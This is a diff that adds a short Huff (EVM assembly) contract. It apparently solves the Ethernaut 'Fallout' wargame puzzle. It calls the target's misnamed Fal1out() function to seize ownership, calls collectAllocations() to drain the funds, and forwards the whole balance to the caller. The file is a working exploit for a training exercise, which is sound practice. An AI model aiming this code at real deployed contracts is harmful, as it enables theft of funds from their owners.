@@ -1,0 +1,28 @@
+#include "huffmate/utils/Calls.huff"
+
+#define macro MAIN() = takes (0) returns (0) {
+  0x04 calldataload // address
+
+  dup1 iszero end jumpi
+
+  // puzzle.Fal1out();
+  __FUNC_SIG("Fal1out()")
+  0x00 mstore
+  
+  CALL(0x00, 0x00, 0x04, 0x1c, 0x00, dup6, gas)
+  pop // pop to discard the return value (im not checking the return value)
+
+  // puzzle.collectAllocations();
+  __FUNC_SIG("collectAllocations()")
+  0x00 mstore
+  
+  CALL(0x00, 0x00, 0x04, 0x1c, 0x00, dup6, gas)
+
+
+  // msg.sender.call{value: address(this).balance}();
+
+  // lets send all the money to the caller
+  CALL(0x00, 0x00, 0x00, 0x00, selfbalance, caller, gas)
+
+  end:
+}
